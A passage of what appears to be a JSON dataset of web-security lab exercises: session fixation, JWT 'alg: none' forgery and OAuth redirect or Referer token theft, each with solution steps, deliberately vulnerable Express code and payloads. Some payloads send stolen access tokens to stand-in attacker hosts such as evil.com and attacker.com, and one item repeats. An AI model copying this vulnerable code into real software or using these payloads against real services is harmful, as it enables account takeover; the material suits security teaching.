    "Replay the token in Authorization: Bearer to access protected resources as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const soap = require('soap'); const app = express(); app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'token-for-carlos'; res.send(`<script>window.location='${redirectUri}#access_token=${accessToken}'</script>`); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",
  "payloads": [
    "https://vulnerable-site.com/oauth/authorize?client_id=xyz&response_type=token&redirect_uri=https://evil.com",
    "Leaked URL: https://evil.com#access_token=token-for-carlos",
    "Authorization: Bearer token-for-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation via Reused Auth Token in SOAP API",
  "Lab Description": "The application's SOAP-based login system fails to issue new session identifiers upon re-authentication. The application retains the initial session ID for subsequent logins. To solve: exploit session fixation to gain access to the victim's session by tricking them into logging in with a fixed session identifier.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Intercept SOAP request with Burp Suite and capture the session cookie assigned on initial request.",
    "Observe the response structure and note that the session cookie remains unchanged across logins.",
    "Craft a SOAP login payload with victim credentials and replay it while maintaining the same session cookie.",
    "Send phishing link or script to the victim embedding the fixed session cookie in a browser session.",
    "After victim logs in, reuse the fixed session cookie to access their authenticated session."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text({ type: 'application/soap+xml' })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/soap-auth', (req, res) => { const sessionId = req.cookies.sessionid || Math.random().toString(36).substring(2); const creds = req.body.match(/<username>(.*?)<\\/username>.*?<password>(.*?)<\\/password>/); const [_, username, password] = creds; const user = users.find(u => u.username === username && u.password === password); if (user) { res.setHeader('Set-Cookie', `sessionid=${sessionId}; HttpOnly`); res.send(`<response><message>Login successful</message></response>`); } else { res.status(403).send(`<response><message>Unauthorized</message></response>`); } }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid === 'fixsession123') return res.send('Account: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running on http://localhost:4000'));",
  "payloads": [
    "<soap><username>carlos</username><password>letmein</password></soap>",
    "Set-Cookie: sessionid=fixsession123",
    "GET /my-account with sessionid=fixsession123"
  ]
},
{
  "Lab scenario": "JWT Signature Confusion in Authorization Header",
  "Lab Description": "The application uses a JWKS endpoint to validate JWTs but does not validate the 'kid' field properly. This allows attackers to supply a custom public key and forge tokens. To solve: forge an admin token by injecting a manipulated 'kid' field and supplying your own matching public key.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use Postman to inspect JWT in the Authorization header and extract its structure.",
    "Send a forged token with a 'kid' referencing a custom key you control, using Burp Repeater.",
    "Host a malicious JWKS endpoint serving your public key under the specified 'kid'.",
    "Modify the payload to escalate privileges to admin and re-sign the token.",
    "Use the forged JWT to access the admin-only endpoint."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const jwksClient = require('jwks-rsa'); const app = express(); const client = jwksClient({ jwksUri: 'http://localhost:4001/.well-known/jwks.json' }); const getKey = (header, callback) => { client.getSigningKey(header.kid, (err, key) => { if (err) return callback(err); const signingKey = key.getPublicKey(); callback(null, signingKey); }); }; app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; jwt.verify(token, getKey, {}, (err, decoded) => { if (err || decoded.role !== 'admin') return res.status(403).send('Access Denied'); res.send('Welcome, admin!'); }); }); app.listen(4000, () => console.log('JWT Signature Confusion Lab running on http://localhost:4000'));",
  "payloads": [
    "{ \"alg\": \"RS256\", \"kid\": \"maliciousKey1\" }",
    "{ \"username\": \"carlos\", \"role\": \"admin\" }",
    "Signed token with RS256 using attacker's private key",
    "GET /admin with Authorization: Bearer <forged_token>"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration via Open Redirect in Redirect URI",
  "Lab Description": "The application allows arbitrary redirect URIs after OAuth login. This misconfiguration can be abused to steal access tokens. To solve: capture a valid access token for the victim by injecting a malicious redirect_uri that sends the token to your server.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Using OWASP ZAP, intercept the OAuth flow and analyze the redirect_uri behavior.",
    "Test redirect_uri with an external domain (your controlled endpoint) to confirm open redirect is allowed.",
    "Construct an OAuth authorization URL with redirect_uri pointing to your malicious endpoint.",
    "Send phishing link containing the crafted URL to the victim to trick them into authenticating.",
    "Intercept the redirect and capture the access token sent in the URL fragment or query string."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const clients = [{ client_id: 'app123', redirect_uri: 'ANY' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client) return res.status(403).send('Invalid client'); const token = 'access-token-carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on http://localhost:4000'));",
  "payloads": [
    "http://localhost:4000/oauth/authorize?client_id=app123&redirect_uri=https://attacker.com/steal-token",
    "https://attacker.com/steal-token?access_token=access-token-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in REST API login flow",
  "Lab Description": "This lab's session management is vulnerable to session fixation through insecure handling of session cookies during login. The application sets a session cookie before authentication and reuses it post-login without regeneration. To solve: Fixate a session ID and force Carlos to authenticate using the attacker-defined session.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1.Using Burp Suite, intercept a GET /login request and observe that a session cookie is set pre-authentication.",
    "2.Send the GET /login request to Burp Repeater and note the issued session ID.",
    "3.Force this session ID to be used by Carlos: trick him via CSRF or send a crafted link (simulate using /simulate-carlos-login endpoint with your cookie).",
    "4.Log in as Carlos using valid credentials (already known or via enumeration).",
    "5.Reuse the attacker-controlled session cookie to access /my-account as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); app.use(session({ secret: 'vulnerablesecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'supersecret' }]; app.get('/login', (req, res) => { res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = user.username; res.send('Welcome!'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') res.send('Account page of Carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Reuse pre-login session cookie after Carlos authenticates",
    "Force victim to use attacker session ID: /simulate-carlos-login?cookie=sessionID",
    "Access /my-account with fixed session"
  ]
},
{
  "Lab scenario": "JWT tampering via alg=none in GraphQL authentication",
  "Lab Description": "The GraphQL login endpoint returns a JWT that is improperly validated. The server does not enforce signature verification when the alg field is set to 'none'. To solve: Modify a valid JWT to impersonate Carlos by removing the signature and setting alg to none.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use Postman to log in as a regular user and capture the JWT from the Authorization header.",
    "2.Decode the JWT using jwt.io or Burp Decoder. Observe the HS256 alg and payload structure.",
    "3.Modify the header to {\"alg\":\"none\"} and the payload to {\"username\":\"carlos\"}. Remove the signature section.",
    "4.Send a request to the GraphQL endpoint using the tampered token: POST /graphql with Authorization: Bearer <modified_token>.",
    "5.Query the account details with: { me { username email } } and verify access as Carlos."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); app.use(bodyParser.json()); const users = [{ username: 'carlos', password: 'jwtflaw' }]; const schema = buildSchema(` type Query { me: User } type User { username: String, email: String } `); const root = { me: (args, context) => { return { username: context.user.username, email: context.user.username + '@example.com' }; } }; app.use('/graphql', (req, res, next) => { const token = req.headers['authorization']?.split(' ')[1]; if (token) { try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { req.user = decoded.payload; } else { req.user = jwt.verify(token, 'secret'); } } catch (e) { return res.status(403).send('Invalid token'); } } else { return res.status(401).send('Missing token'); } next(); }, graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: true }))); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Header: {\"alg\":\"none\"}, Payload: {\"username\":\"carlos\"}",
    "Remove signature section of JWT",
    "POST /graphql with Authorization: Bearer <modified_token>",
    "{ me { username email } }"
  ]
},
{
  "Lab scenario": "OAuth Misconfiguration in redirect URI validation",
  "Lab Description": "The application implements OAuth implicit flow but fails to strictly validate redirect URIs. An attacker can hijack tokens by manipulating the redirect URI to point to a domain they control. To solve: Capture the access token issued for Carlos by hijacking the redirect.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1.Use OWASP ZAP to proxy the OAuth flow: initiate login and capture the authorization request to /authorize.",
    "2.Observe the redirect_uri parameter. Note that the app allows any subdomain of attacker-site.com.",
    "3.Craft a malicious redirect_uri like https://evil.attacker-site.com/callback and initiate the auth request with carlos logged in.",
    "4.Trigger the OAuth flow (simulate if needed via /simulate-oauth?user=carlos) and capture the redirected request on evil.attacker-site.com.",
    "5.Extract the access_token from the URI fragment and use it in Authorization header: GET /my-account with Bearer token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); const oauthTokens = {}; const clients = [{ client_id: 'abc123', redirect_uri: 'https://*.attacker-site.com/callback' }]; const users = [{ username: 'carlos' }]; app.get('/authorize', (req, res) => { const { client_id, redirect_uri, response_type, state } = req.query; const client = clients.find(c => c.client_id === client_id); if (!client || !redirect_uri.includes('.attacker-site.com')) return res.status(400).send('Invalid redirect URI'); const token = Buffer.from('carlos:' + Date.now()).toString('base64'); oauthTokens[token] = 'carlos'; res.redirect(`${redirect_uri}#access_token=${token}&state=${state}`); }); app.get('/my-account', (req, res) => { const token = req.headers['authorization']?.split(' ')[1]; if (oauthTokens[token] === 'carlos') res.send('Carlos account accessed'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth Redirect Hijack Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "Redirect URI: https://evil.attacker-site.com/callback",
    "Access token from URI fragment: #access_token=...",
    "Authorization: Bearer <token>",
    "GET /my-account"
  ]
},
{
  "Lab scenario": "Session Fixation in SOAP API login flow",
  "Lab Description": "This lab demonstrates session fixation via SOAP-based authentication. The application reuses an existing session ID after login instead of generating a new one. This allows attackers to fix a session ID before victim login. The SOAP API accepts session tokens via HTTP headers, and the server provides overly verbose XML errors on failed authentication. To solve: fix a session ID, force the victim to authenticate into it, and access their profile page.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "1. Use Burp Suite to observe the SOAP login request: POST /soap-auth with SOAPAction header and XML body.",
    "2. Send an unauthenticated request to /profile. Capture the Set-Cookie header with JSESSIONID.",
    "3. Fixate the session ID by injecting the JSESSIONID into the victim’s browser using a CSRF bait page or reflected XSS endpoint.",
    "4. After the victim logs in using the SOAP login endpoint, reuse the same JSESSIONID in your session.",
    "5. Access /profile with the fixed JSESSIONID. If you see the victim’s account data, the lab is solved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const soap = require('soap'); const bodyParser = require('body-parser'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'soapSecret', resave: false, saveUninitialized: true })); app.use(bodyParser.text({ type: 'text/xml' })); const users = [{ username: 'carlos', password: 'pass123' }]; app.post('/soap-auth', (req, res) => { const xml = req.body; const creds = parseSOAP(xml); const user = users.find(u => u.username === creds.username && u.password === creds.password); if (!user) return res.status(500).send(`<SOAP-ENV:Fault><faultstring>Invalid credentials for ${creds.username}</faultstring></SOAP-ENV:Fault>`); req.session.user = user.username; res.send(`<SOAP-ENV:Envelope><Body><status>Login successful</status></Body></SOAP-ENV:Envelope>`); }); app.get('/profile', (req, res) => { if (!req.session.user) return res.status(403).send('Unauthorized'); res.send(`Profile for ${req.session.user}`); }); function parseSOAP(xml) { const username = xml.match(/<username>(.*?)<\\/username>/)[1]; const password = xml.match(/<password>(.*?)<\\/password>/)[1]; return { username, password }; } const PORT = 4000; app.listen(PORT, () => console.log(`Session Fixation SOAP Lab running on http://localhost:${PORT}`));",
  "payloads": [
    "<soapenv:Envelope><Body><username>carlos</username><password>pass123</password></Body></soapenv:Envelope>",
    "Cookie: JSESSIONID=FIXEDSESSIONID123",
    "XML Injection via malformed username fields (testing debug logs)"
  ]
},
{
  "Lab scenario": "JWT Authentication Bypass via 'none' algorithm in REST API",
  "Lab Description": "The lab uses JWTs for REST API authentication but does not properly verify the token signature algorithm. The server accepts tokens with 'alg':'none' and does not enforce a secret check. To solve: forge a JWT with 'none' algorithm to impersonate Carlos and access the /api/userinfo endpoint.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "1. Use Postman to log in and inspect the JWT token returned in Authorization: Bearer <token> format.",
    "2. Decode the JWT in jwt.io and analyze the header. Note that it uses HS256.",
    "3. Craft a JWT with header {'alg':'none'} and payload {'username':'carlos'} with no signature.",
    "4. Send a GET /api/userinfo request with Authorization: Bearer <forged-token>.",
    "5. If the response returns Carlos’s user info, the lab is solved."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecret'; const users = [{ username: 'carlos', password: 'carlospass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return res.json({ user: decoded.payload.username }); try { const verified = jwt.verify(token, secret); res.json({ user: verified.username }); } catch { res.status(403).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running at http://localhost:${PORT}`));",
  "payloads": [
    "Header: {\"alg\":\"none\"}",
    "Payload: {\"username\":\"carlos\"}",
    "JWT: base64UrlEncode(header).base64UrlEncode(payload)."
  ]
},
{
  "Lab scenario": "OAuth Code Interception in GraphQL Login Flow",
  "Lab Description": "The application implements login via OAuth in a GraphQL mutation using the authorization code grant. However, the client doesn't bind the authorization code to the session. An attacker can intercept the code and redeem it on their session to hijack the victim's login. To solve: intercept Carlos's OAuth code and redeem it via GraphQL to impersonate him.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "1. Use OWASP ZAP to proxy traffic and inspect the GraphQL mutation flow after initiating OAuth login.",
    "2. Observe the OAuth redirect URL leaking the authorization code in the query string.",
    "3. Simulate interception by copying Carlos’s code parameter and replaying it in your own GraphQL login mutation.",
    "4. Send the GraphQL mutation loginWithOAuth(code: \"<intercepted>\")",
    "5. If your session is authenticated as Carlos, navigate to /me to solve the lab."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', oauth_id: 'oauth123' }]; app.use(bodyParser.json()); app.post('/graphql', (req, res) => { const query = req.body.query; if (query.includes('loginWithOAuth')) { const code = query.match(/code: \\\"(.*?)\\\"/)[1]; const user = users.find(u => u.oauth_id === code); if (!user) return res.status(403).json({ error: 'Invalid code' }); const sessionId = 'sess_' + Math.random().toString(36).slice(2); sessions[sessionId] = user.username; res.json({ token: sessionId }); } }); app.get('/me', (req, res) => { const token = req.headers['authorization']; const username = sessions[token]; if (!username) return res.status(401).send('Unauthorized'); res.send(`Welcome ${username}`); }); const PORT = 4000; app.listen(PORT, () => console.log(`OAuth GraphQL Lab running at http://localhost:${PORT}`));",
  "payloads": [
    "loginWithOAuth(code: \"oauth123\")",
    "Replay intercepted code in GraphQL mutation: { mutation { loginWithOAuth(code: \"oauth123\") } }",
    "Authorization: sess_<generated_session>"
  ]
},
{
  "Lab scenario": "Session fixation in SOAP login handler",
  "Lab Description": "The application's SOAP-based login mechanism does not regenerate session tokens after authentication. The application accepts externally provided session tokens via a JSESSIONID cookie. This allows an attacker to fixate a session ID for a victim prior to authentication. To solve: fixate a session and hijack Carlos's authenticated session using a shared SOAP login channel.",
  "Difficulty Level": "Hard",
  "Solution Steps": [
    "Use OWASP ZAP to proxy and observe the SOAP login endpoint and session cookies.",
    "Send an unauthenticated SOAP request to generate a session, and copy the issued JSESSIONID.",
    "Send a crafted phishing link to Carlos embedding the fixed JSESSIONID in a cookie.",
    "Once Carlos logs in, reuse the same session ID to access the authenticated state.",
    "Verify by navigating to /my-account and confirming access to Carlos's data."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const soap = require('soap'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'soapsecret', resave: false, saveUninitialized: true })); const users = [{ username: 'carlos', password: 'carlos123' }]; app.post('/soap-login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = user.username; res.send(`<soap:Envelope><soap:Body><loginResponse>Success</loginResponse></soap:Body></soap:Envelope>`); } else { res.status(403).send(`<soap:Envelope><soap:Body><loginResponse>Failure</loginResponse></soap:Body></soap:Envelope>`); } }); app.get('/my-account', (req, res) => { if (req.session.user) res.send(`Account data for ${req.session.user}`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running...'));",
  "payloads": [
    "Set-Cookie: JSESSIONID=attackerSession123;",
    "SOAP POST with <username>carlos</username> and <password>carlos123</password> using fixed JSESSIONID",
    "GET /my-account with Cookie: JSESSIONID=attackerSession123"
  ]
},
{
  "Lab scenario": "JWT algorithm tampering in GraphQL login",
  "Lab Description": "The application uses JWTs signed with HS256 but accepts unsigned JWTs due to improper algorithm checks. The login mutation accepts a token returned in the login response and trusts it without re-verification. To solve: manipulate the JWT's alg claim and gain access to Carlos's protected GraphQL data.",
  "Difficulty Level": "Medium",
  "Solution Steps": [
    "Use Postman to send a GraphQL mutation and analyze the login response and token structure.",
    "Export the JWT and decode it. Modify the 'alg' header from HS256 to 'none'.",
    "Remove the signature and rebuild the token as a valid unsigned JWT.",
    "Replay the token in the Authorization header to access Carlos’s profile query.",
    "Confirm success by querying for Carlos’s email address using the modified token."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const schema = require('./schema'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'secret', email: 'carlos@example.com' }]; app.post('/graphql', (req, res, next) => { if (req.body.query.includes('login')) { const { username, password } = req.body.variables; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ user: user.username }, 'supersecret', { algorithm: 'HS256' }); return res.json({ data: { login: token } }); } else return res.status(403).send('Invalid credentials'); } next(); }); app.use('/graphql', graphqlHTTP({ schema, graphiql: true })); app.listen(4000, () => console.log('JWT Tampering Lab running...'));",
  "payloads": [
    "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
    "Payload: { \"user\": \"carlos\" }",
    "Final token: base64(header).base64(payload).",
    "Authorization: Bearer [unsigned JWT]",
    "GraphQL query: { profile { email } }"
  ]
},
{
  "Lab scenario": "OAuth access token leakage in Referer header",
  "Lab Description": "The application integrates OAuth for login and redirects the user to a third-party site after authentication. However, the OAuth access token is included in the redirect URL, which is then leaked via the Referer header. To solve: intercept the leaked token from the Referer header and access Carlos's account.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Use Burp Suite to intercept the OAuth redirect after login and capture the Referer header sent to the third-party site.",
    "Note the presence of the access_token parameter in the Referer URL.",
    "Copy the leaked token and replay it in an Authorization header.",
    "Send GET /my-account with the Bearer token of Carlos.",
    "Confirm access to Carlos’s account and capture email from response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; res.redirect(`http://partner.com/landing?access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') res.send('Account: carlos, Email: carlos@example.com'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
  "payloads": [
    "Captured token: access_token=carlos-oauth-token",
    "Authorization: Bearer carlos-oauth-token",
    "GET /my-account with captured token"
  ]
},
{
  "Lab scenario": "OAuth access token leakage in Referer header",
  "Lab Description": "The application integrates OAuth for login and redirects the user to a third-party site after authentication. However, the OAuth access token is included in the redirect URL, which is then leaked via the Referer header. To solve: intercept the leaked token from the Referer header and access Carlos's account.",
  "Difficulty Level": "Easy",
  "Solution Steps": [
    "Use Burp Suite to intercept the OAuth redirect after login and capture the Referer header sent to the third-party site.",
    "Note the presence of the access_token parameter in the Referer URL.",
    "Copy the leaked token and replay it in an Authorization header.",
    "Send GET /my-account with the Bearer token of Carlos.",
    "Confirm access to Carlos’s account and capture email from response."
  ],
  "Vulnerability name": "Authentication",
  "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const accessToken = req.query.access_token; res.redirect(`http://partner.com/landing?access_token=${accessToken}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer carlos-oauth-token') res.send('Account: carlos, Email: carlos@example.com'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Referer Leak Lab running...'));",
  "payloads": [
    "Captured token: access_token=carlos-oauth-token",
    "Authorization: Bearer carlos-oauth-token",
    "GET /my-account with captured token"
  ]
},
{
  "Lab scenario": "Session Fixation via SOAP login flow in Session Management",

  "Lab Description": "The application processes login sessions through a SOAP-based authentication handler. It fails to regenerate session identifiers upon successful login. The server accepts session IDs via the JSESSIONID cookie and binds them to accounts without invalidation. To solve: fixate a session ID before login and use it to hijack Carlos’s session post-authentication.",

  "Difficulty Level": "Easy",

  "Solution Steps": [
    "Use OWASP ZAP to intercept the initial unauthenticated SOAP request and extract the issued JSESSIONID.",
    "Send a crafted SOAP login request with Carlos’s credentials using Postman while preserving the previously obtained JSESSIONID.",
    "Use Burp Suite to replay the request and confirm session fixation by observing that the same JSESSIONID is still active after authentication.",
    "Switch to browser and inject the fixed session ID into cookies while visiting /my-account.",
    "Confirm access to Carlos’s account page using the hijacked session."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const soap = require('soap'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'soapsecret', resave: false, saveUninitialized: true })); app.use(bodyParser.text({ type: 'text/xml' })); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/soap-login', (req, res) => { const xml = req.body; const match = xml.match(/<username>(.*?)<\\/username><password>(.*?)<\\/password>/); if (!match) return res.status(400).send('Invalid request'); const [_, username, password] = match; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Login failed'); req.session.user = user.username; console.log('[DEBUG] Session ID fixed:', req.sessionID); res.send(`<response><status>success</status></response>`); }); app.get('/my-account', (req, res) => { if (req.session.user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running'));",

  "payloads": [
    "JSESSIONID=prelogin123",
    "<soapenv:Envelope><soapenv:Body><login><username>carlos</username><password>letmein</password></login></soapenv:Body></soapenv:Envelope>",
    "Cookie: JSESSIONID=prelogin123"
  ]
},
{
  "Lab scenario": "JWT algorithm confusion in Authorization header in Bearer Token Authentication",

  "Lab Description": "The API accepts JWT tokens using the Authorization header. It trusts the 'alg' field in the token without verifying if a valid signature is provided. This flaw allows switching from HS256 to 'none' algorithm, effectively bypassing signature validation. To solve: forge a token granting admin access and retrieve Carlos’s profile data.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "Use Postman to send an authenticated request and capture the original JWT from the Authorization header.",
    "Decode the JWT using jwt.io or Burp Decoder and observe the 'alg':'HS256' field.",
    "Create a forged JWT with 'alg':'none' and payload {\"user\":\"carlos\",\"role\":\"admin\"} using jwt.io or a Python script.",
    "Use Burp Suite to replace the Authorization header with the forged token and send it to /api/user/profile.",
    "Confirm unauthorized access by observing Carlos’s data in the response."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', role: 'user' }]; app.get('/api/user/profile', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('No token'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') { const payload = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (payload.user === 'carlos' && payload.role === 'admin') return res.json({ profile: 'Carlos personal data' }); } return res.status(403).send('Unauthorized'); }); app.listen(4001, () => console.log('JWT Alg Confusion Lab running'));",

  "payloads": [
    "Authorization: Bearer <header: {\"alg\":\"none\"}, payload: {\"user\":\"carlos\",\"role\":\"admin\"}, signature: \"\" >",
    "curl -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.' http://localhost:4001/api/user/profile"
  ]
},
{
  "Lab scenario": "OAuth 2.0 token leakage in redirect_uri parameter via Authorization Code Flow",

  "Lab Description": "The app uses OAuth 2.0 Authorization Code flow for third-party authentication. It fails to validate exact matching of redirect_uri during code-to-token exchange, enabling token hijacking by supplying a malicious redirect URI on callback. To solve: steal Carlos’s access token using an attacker-controlled domain.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "Use Burp Suite to capture the /authorize?client_id flow and note the registered redirect_uri.",
    "Change the redirect_uri to a malicious but similar-looking domain (e.g., attacker.com instead of trusted.com) in the initial authorization request.",
    "After Carlos logs in, the authorization server redirects the code to your malicious domain with the token in the URL.",
    "Extract the leaked token from your attacker server log or browser.",
    "Use Postman to access /account/details with the stolen token as Bearer to retrieve Carlos’s data."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const app = express(); const tokens = {}; const clients = [{ id: '123', redirect_uri: 'https://trusted.com/callback' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const client = clients.find(c => c.id === client_id); if (!client) return res.status(400).send('Unknown client'); // Incorrect matching logic if (!redirect_uri.includes(client.redirect_uri)) return res.status(400).send('Redirect mismatch'); const code = 'authcode123'; tokens[code] = { user: 'carlos', scope: 'read' }; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.get('/oauth/token', (req, res) => { const { code } = req.query; if (tokens[code]) return res.json({ access_token: 'leaked-token-for-carlos' }); res.status(400).send('Invalid code'); }); app.get('/account/details', (req, res) => { if (req.headers.authorization === 'Bearer leaked-token-for-carlos') res.send('Carlos private account details'); else res.status(403).send('Unauthorized'); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",

  "payloads": [
    "GET /oauth/authorize?client_id=123&redirect_uri=https://attacker.com/callback&state=abc",
    "GET /oauth/token?code=authcode123",
    "Authorization: Bearer leaked-token-for-carlos"
  ]
},
{
  "Lab scenario": "Session Fixation in REST login flow",

  "Lab Description": "This application improperly handles session identifiers during the login process. A fixed session cookie provided before authentication is retained after successful login. The application binds authenticated sessions to pre-login identifiers, allowing attackers to force users to authenticate into attacker-controlled sessions. To solve: hijack Carlos's session and access his account dashboard.",

  "Difficulty Level": "Medium",

  "Solution Steps": [
    "1.Using Burp Suite, capture a GET /session request prior to logging in to observe the Set-Cookie header.",
    "2.Send the unauthenticated session ID to the victim via a crafted phishing page.",
    "3.Login to your own account and observe that your session ID changes upon successful login. Confirm mismatch.",
    "4.Use Burp to log in with the victim's credentials but force your controlled session ID via Burp's cookie editor.",
    "5.Access /dashboard using the fixed session and confirm access to Carlos's account."
  ],

  "Vulnerability name": "Authentication",

  "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); let sessions = {}; const users = [{ username: 'carlos', password: 's3cr3t' }]; app.get('/session', (req, res) => { const sid = 'sess-' + Math.random().toString(36).substring(2); sessions[sid] = null; res.cookie('sid', sid).send('Session created'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sid; const user = users.find(u => u.username === username && u.password === password); if (!sid || !sessions[sid]) return res.status(400).send('Invalid session'); if (user) { sessions[sid] = username; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/dashboard', (req, res) => { const sid = req.cookies.sid; const username = sessions[sid]; if (username) res.send('Welcome to your dashboard, ' + username); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab running at http://localhost:4000'));",

  "payloads": [
    "GET /session",
    "POST /login with Cookie: sid=sess-fixed",
    "Reuse sess-fixed after victim logs in",
    "GET /dashboard with forged session"
  ]
},
{
  "Lab scenario": "JWT None algorithm bypass in GraphQL login mutation",

  "Lab Description": "The GraphQL login mutation issues a JWT for session management but fails to enforce signature validation when the 'alg' header is set to 'none'. This misconfiguration allows an attacker to forge arbitrary tokens without knowing the secret key. To solve: forge a JWT for Carlos and access the /graphql me query.",

  "Difficulty Level": "Hard",

  "Solution Steps": [
    "1.Use Postman to send a login mutation and observe the signed JWT in the response.",
    "2.Decode the JWT and note the algorithm used in the header.",
